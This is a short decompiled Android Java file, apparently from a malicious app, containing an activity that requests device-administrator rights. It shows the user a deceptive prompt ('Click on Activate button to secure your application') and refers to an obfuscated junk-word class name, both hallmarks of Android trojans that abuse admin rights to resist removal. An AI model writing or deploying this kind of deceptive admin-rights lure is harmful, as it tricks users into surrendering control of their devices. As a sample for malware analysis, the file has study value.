package com.appser;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

public class activityadm extends Activity {
    private static final int REQUEST_CODE = 0;
    public static DevicePolicyManager mDPM;
    private ComponentName mAdminName;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            getApplicationContext();
            mDPM = (DevicePolicyManager) getSystemService("device_policy");
            ComponentName componentName = new ComponentName(this, AdminReciver.class);
            this.mAdminName = componentName;
            if (!mDPM.isAdminActive(componentName)) {
                Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
                intent.putExtra("android.app.extra.DEVICE_ADMIN", this.mAdminName);
                intent.putExtra("android.app.extra.ADD_EXPLANATION", "Click on Activate button to secure your application.");
                advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_ADM = true;
                startActivityForResult(intent, 0);
            }
        } catch (Exception unused) {
        }
    }
}
